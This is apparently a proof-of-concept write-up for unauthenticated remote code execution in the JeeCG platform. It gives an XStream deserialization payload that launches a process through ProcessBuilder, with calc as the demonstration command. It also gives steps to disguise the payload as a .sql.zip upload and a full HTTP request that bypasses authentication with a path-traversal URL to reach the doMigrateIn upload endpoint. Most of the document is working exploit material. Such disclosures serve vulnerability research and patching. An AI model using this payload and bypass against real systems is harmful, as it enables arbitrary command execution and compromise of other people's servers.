# JeeCG client-side remote code execution

Save the following content as 1.xml
```
<sorted-set>
        <string>foo</string>
        <dynamic-proxy>
                <interface>java.lang.Comparable</interface>
                <handler class="java.beans.EventHandler">
                    <target class="java.lang.ProcessBuilder">
                        <command>
                                <string>cmd</string>
                                <string>/C</string>
                                <string>calc</string>
                            </command>
                    </target>
                <action>start</action>
            </handler>
            </dynamic-proxy>
        </sorted-set>
```

Compress 1.xml into 1.zip and then rename it to 1.sql.zip.
![image](https://github.com/rbndd/tmp/assets/72015616/f84468a7-6139-4216-b226-13250260c285)

Bypass authentication and upload a file through the frontend calling upload interface.
```
POST /jeecg/loginControllerrest/v2/api-docs/../../../cgformSqlController.do?doMigrateIn HTTP/1.1
Host: 10.85.212.54:9000
Content-Length: 649
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIEcBbhinrYepv5J5
Accept: */*
Origin: http://10.85.212.54:9000
Referer: http://10.85.212.54:9000/jeecg/cgformSqlController.do?toCgformMigrate&_=1711013666543
Accept-Language: zh-CN,zh;q=0.9
Cookie: i18n_browser_Lang=zh-cn; JEECGINDEXSTYLE=fineui; JSESSIONID=BCDF7360D9538629391AAE7AC5FCD0F9; ZINDEXNUMBER=2070
Connection: close

------WebKitFormBoundaryIEcBbhinrYepv5J5
Content-Disposition: form-data; name="name"

1.sql.zip
------WebKitFormBoundaryIEcBbhinrYepv5J5
Content-Disposition: form-data; name="file"; filename="1.sql.zip"
Content-Type: application/x-zip-compressed

{{your file content（1.sql.zip）}}

------WebKitFormBoundaryIEcBbhinrYepv5J5--
```

![image](https://cdn.nlark.com/yuque/0/2024/png/1961145/1711075731119-14357fcf-301a-46bd-ab3e-5834bc78d2bd.png?x-oss-process=image%2Fformat%2Cwebp)
![image](https://github.com/rbndd/tmp/assets/72015616/f4278ee5-14ac-4677-8b78-c4e060b0057b)

